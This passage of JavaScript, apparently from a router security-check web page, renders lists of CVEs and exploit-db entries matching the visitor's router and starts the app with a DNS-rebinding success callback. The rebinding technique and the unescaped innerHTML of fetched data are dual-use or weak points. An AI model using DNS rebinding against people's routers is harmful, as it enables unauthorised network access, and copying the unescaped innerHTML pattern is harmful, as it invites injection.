		link.appendChild(linkText);	
		
		element.appendChild(link);
		
		element = document.getElementById("vulntableCVE");
		element.innerHTML = '';	
		
		element = document.getElementById("tablevulntableCVE");
		element.classList.add("visually-hidden");
			
	} else {
			
		element = document.getElementById("infovulntableCVE");
		element.innerHTML = "Below are the CVE related to your router, from ";
		
		var link = document.createElement("a");
		link.setAttribute("href", "https://cve.mitre.org");
		link.setAttribute("target", "_blank");
		link.setAttribute("rel", "noopener noreferrer");
		
		var linkText = document.createTextNode("cve.mitre.org");
		link.appendChild(linkText);	
		
		element.appendChild(link);
		
		element = document.getElementById("vulntableCVE");
		element.innerHTML = '';
		
		var row, cellA, cellB;
		
		for(var i = 0; i < data.CVE.length; i++) {
			var obj = data.CVE[i];
			
			link = document.createElement("a");
			link.setAttribute("href", "https://cve.mitre.org" + obj.Link);
			link.setAttribute("target", "_blank");
			link.setAttribute("rel", "noopener noreferrer");			
			
			linkText = document.createTextNode(obj.CVE);
			link.appendChild(linkText);

			row = document.createElement("tr");
			cellA = document.createElement("td");
			cellB = document.createElement("td");

			cellA.appendChild(link);
			if((obj.Desc).length > 60) {
				obj.Desc = (obj.Desc).substring(0,60);
				obj.Desc += "...";
			}
			cellB.innerHTML = obj.Desc;

			element.appendChild(row);
			row.appendChild(cellA);
			row.appendChild(cellB);
		}
	}
	
	if (data.Exploit === null) {
	
		element = document.getElementById("infovulntableExploit");
		element.innerHTML = "Network error, reload the page and retry the test.";
		element = document.getElementById("vulntableExploit");
		element.innerHTML = '';
		
		element = document.getElementById("tablevulntableExploit");
		element.classList.add("visually-hidden");
	
	} else if (data.Exploit[0].Link === "null" ) {
	
		element = document.getElementById("infovulntableExploit");
		element.innerHTML = "There is no Exploit related to your router, from  ";
		
		link = document.createElement("a");
		link.setAttribute("href", "https://www.exploit-db.com");
		link.setAttribute("target", "_blank");
		link.setAttribute("rel", "noopener noreferrer");
		
		linkText = document.createTextNode("www.exploit-db.com");
		link.appendChild(linkText);	
		
		element.appendChild(link);
		
		element = document.getElementById("vulntableExploit");
		element.innerHTML = '';
		
		element = document.getElementById("tablevulntableExploit");
		element.classList.add("visually-hidden");
		
	} else {
	
		element = document.getElementById("infovulntableExploit");
		element.innerHTML = "Below are the Exploit related to your router, from ";
		
		link = document.createElement("a");
		link.setAttribute("href", "https://www.exploit-db.com");
		link.setAttribute("target", "_blank");
		link.setAttribute("rel", "noopener noreferrer");
		
		linkText = document.createTextNode("www.exploit-db.com");
		link.appendChild(linkText);	
		
		element.appendChild(link);
		
		element = document.getElementById("vulntableExploit");
		element.innerHTML = '';

		for(var i = 0; i < data.Exploit.length; i++) {
			var obj = data.Exploit[i];
			
			link = document.createElement("a");
			link.setAttribute("href", "https://www.exploit-db.com" + obj.Link);
			link.setAttribute("target", "_blank");
			link.setAttribute("rel", "noopener noreferrer");			
			
			if((obj.Desc).length > 60) {
				obj.Desc = (obj.Desc).substring(0,60);
				obj.Desc += "...";
			}		
			linkText = document.createTextNode(obj.Desc);
			link.appendChild(linkText);

			row = document.createElement("tr");
			cellA = document.createElement("td");
			cellB = document.createElement("td");

			cellA.innerHTML = obj.CVE;
			cellB.appendChild(link);

			element.appendChild(row);
			row.appendChild(cellA);
			row.appendChild(cellB);
		}
	}			
}

// Start
const app = App();
app.init(rebindingSuccessCb);

